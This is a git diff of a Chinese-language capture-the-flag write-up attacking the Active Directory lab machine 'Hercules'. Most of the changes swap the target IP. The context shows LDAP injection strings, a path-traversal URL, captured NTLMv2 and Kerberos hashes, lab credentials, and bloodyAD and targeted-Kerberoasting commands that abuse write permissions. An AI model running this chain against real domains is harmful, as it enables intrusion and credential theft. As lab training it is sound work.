@@ -27,7 +27,7 @@ tags:
 11. 使用无SPN的账户进行基于资源的约束性委派
 
 ```bash
-$ rustscan -u 5000 -a 10.129.162.185   
+$ rustscan -u 5000 -a 10.129.18.48   
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -41,27 +41,27 @@ With RustScan, I scan ports so fast, even my firewall gets whiplash 💨
 
 [~] The config file is expected to be at "/home/lambermaybe/.rustscan.toml"
 [~] Automatically increasing ulimit value to 5000.
-Open 10.129.162.185:53
-Open 10.129.162.185:80
-Open 10.129.162.185:88
-Open 10.129.162.185:135
-Open 10.129.162.185:139
-Open 10.129.162.185:389
-Open 10.129.162.185:443
-Open 10.129.162.185:445
-Open 10.129.162.185:464
-Open 10.129.162.185:593
-Open 10.129.162.185:636
-Open 10.129.162.185:3268
-Open 10.129.162.185:3269
-Open 10.129.162.185:9389
-Open 10.129.162.185:49556
-Open 10.129.162.185:49580
-Open 10.129.162.185:49664
-Open 10.129.162.185:49668
-Open 10.129.162.185:50811
-Open 10.129.162.185:58667
-Open 10.129.162.185:58674
+Open 10.129.18.48:53
+Open 10.129.18.48:80
+Open 10.129.18.48:88
+Open 10.129.18.48:135
+Open 10.129.18.48:139
+Open 10.129.18.48:389
+Open 10.129.18.48:443
+Open 10.129.18.48:445
+Open 10.129.18.48:464
+Open 10.129.18.48:593
+Open 10.129.18.48:636
+Open 10.129.18.48:3268
+Open 10.129.18.48:3269
+Open 10.129.18.48:9389
+Open 10.129.18.48:49556
+Open 10.129.18.48:49580
+Open 10.129.18.48:49664
+Open 10.129.18.48:49668
+Open 10.129.18.48:50811
+Open 10.129.18.48:58667
+Open 10.129.18.48:58674
 ```
 
 ```
@@ -72,27 +72,6 @@ Open 10.129.162.185:58674
 )
 )(cn=))\x00	
 *)(uid=*))(|(uid=*
-
-_
-@
-{
-}
--
-/
-(
-)
-!
-"
-$
-%
-=
-^
-[
-]
-:
-;
-
-
 
 
 adriana.i
@@ -138,7 +117,7 @@ zeke.s
 
 
 
-https://10.129.162.185/Home/Download?fileName=../../web.config
+https://10.129.18.48/Home/Download?fileName=../../web.config
 ```
 
 
@@ -250,7 +229,7 @@ Content-Length: 4896
 
 
 ```
-[SMB] NTLMv2-SSP Client   : 10.129.162.185
+[SMB] NTLMv2-SSP Client   : 10.129.18.48
 [SMB] NTLMv2-SSP Username : HERCULES\natalie.a
 [SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:b8ab11fe0325dc1f:5DBFC1C696ABE315994361D7C0602CDC:0101000000000000801D523FE341DC0165EA338122C81F7B0000000002000800430059004F00440001001E00570049004E002D005300570043003800320054005100560054005700590004003400570049004E002D00530057004300380032005400510056005400570059002E00430059004F0044002E004C004F00430041004C0003001400430059004F0044002E004C004F00430041004C0005001400430059004F0044002E004C004F00430041004C0007000800801D523FE341DC0106000400020000000800300030000000000000000000000000200000E8462BC485281D1D07DCB31D348D8C3060188BF0818A694DBB92A327CBE1FB100A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300037000000000000000000
 
@@ -296,7 +275,7 @@ Content-Type: text/html; charset="us-ascii"
 Content-Transfer-Encoding: quoted-printable
 ---
 
-targetedKerberoast.py -v -d 'hercules.htb' --dc-ip 10.129.162.185 -u 'natalie.a' -p 'Prettyprincess123!' -k --request-user bob.w --only-abuse --dc-host 'dc.hercules.htb'
+targetedKerberoast.py -v -d 'hercules.htb' --dc-ip 10.129.18.48 -u 'natalie.a' -p 'Prettyprincess123!' -k --request-user bob.w --only-abuse --dc-host 'dc.hercules.htb'
 
 $krb5tgs$23$*bob.w$HERCULES.HTB$hercules.htb/bob.w*$c95ddf5fd0be1f2ce71ed14731d65e0b$70e1e4fd2d59a4536bec84fafc8b84d3a8a86c5228542b8a31ce93f241c5895467b0ec1b5ce87356e19be89d5d71ae56b667c2764867ff179af4fd761f05d70f71aec6c8de763fce1a5b130a1a46d49468081cce48d9c59c2a13514bf46c819551bd26006318b7facec1280d9c1768c40d322d4293767029b8551e7b111c9d936308b73f5ae7fb320fc1f16ec9852dc0f661d228f47a0c13efd1cf55011a4773e9c72d5f644ca770c8bfec663170be3eb11c3cac271e75e14ed3b8fc3cd9ed84f4c207a8e65350d26b783c713038bc0cb4ecd44b87861d7f0435aadce18b822f57bccedac9e99c1e5b998b7b949e432b64f9273adadcd561aff5f3ed18c93b162249f374dffc9e8597ef9d209ff172bbac973098bef7fd7d138db234cf1c31e9216c318965120995a2fc1e27272c188ffa9ff5f55e7889da3b7d2880acef6dd77c0d6e4e7b3d6b8a861c9007790736942e445f3302e1a78dacab74414647bd3425b25d888117bdd6836a2c957d17955d5dbc3695c4dd4621a93338c022cce688c2a2b486f15eec9ce1ffb4f86f6cb2881a28bcf1644a76cf2e5e95be27985e9709f2e5df55f32190dc7346ff6f87c67932858d81b4ab367ec9f78305e32f66e93326bf065dcad265ee7e9b2d92ccef874028976350e00975125dd26ea08bf482d9ee65a28e69ef39096b2be8fbfb35299713d61e386ad0e7e6d2a9264c2dfbf37d8672c7b5e7d1911d2e39250bb503d9c03996f096dd515912ad73706142c75ece74d8dd6d9e8be55389b4828e80c746bee981651559be98e01d0dec676bead1be48c33f7b4b6cf30943efb1b6b016dc888a4cb3f7a80f0a4267ef280dab7660e6322ec2c0ad1b31cf245a6ceadf2afc516f650f7d750f5ce08cfad588bbc504c92757f17bcdd8979b68bf933b99037e1564480ac95bc59b006413d638fa9222a723df0127b812982a9a838b0cd6ab2afe73371260019740c9949b7e8444813dd3e71f937482ce01de87146d3d7e367feae1ad9976f77707047e2f34f58353e82746036194f7e3d77e9c1590f83c5763ed65276d8e96ab10d5f2215c9d165aaf19dd7907a16fd0cfb1ea43bfe32e924838447d1e00d41e4043773c33077f10cdae85659eee2c4daee04c1dafc1665729e0dba7e5cc9d670ad9e4928eb50ded7372e1f664d90955a8d028c9e6bd30437bef29a33fa88159347a3bfe61f338735261d59e8ca1b2a8e5ca84134cfdfc97bc8777ad78950f8f07a63a55de0d0c6ca373be9b3c7216361a3f5d3ec837a68c82966d5dc71e20efc5b7309b92078ef2242ace197524b7510dcb614776b3ee2baed1102814457b16a9cccd75e96c207aa9aaac76a90747c2e7b5b0bfee0fd16ef762ce3ac407e1fb2ec7b5bd859dacca442d04d5929ed0d9ebc597b66555ad8de625d8a2412fc3740777ead449eb9a437494c9d3fd07b27d7b9fe63ab3998adc8837692ea8c0292ef906120ccde7aa162a6363b0865230a9ac952f0d49b09f37343e27c81ddb5dc8ffca37e9f1c381c9c5e120c7d713be
 
@@ -324,7 +303,7 @@ Recovered NT Hash
 8a65c74e8f0073babbfac6725c66cc3f
 
 
-bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.162.185 get writable
+bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.18.48 get writable
 ```
 
 bob.w 的可写权限
@@ -409,7 +388,7 @@ permission: WRITE
 
 
 
-bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.162.185 get -n "CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" --filter-right "WriteDACL"
+bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.18.48 get -n "CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" --filter-right "WriteDACL"
 ```
 
 写入控制Stephen Miller
@@ -422,9 +401,9 @@ python3 pywhisker/pywhisker.py -d 'hercules.htb' -u 'bob.w' --no-pass -k --targe
 
 
 
-bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.162.185 -u bob.w -k add groupMember "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" "CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
+bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.18.48 -u bob.w -k add groupMember "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" "CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"
 
-bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.162.185 -u bob.w -k add user  --ou "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" 'lamber' 'Password1@'
+bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.18.48 -u bob.w -k add user  --ou "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" 'lamber' 'Password1@'
 
 # 改密码 - 失败
 bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 set password 'CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' 'NewPassword123!'
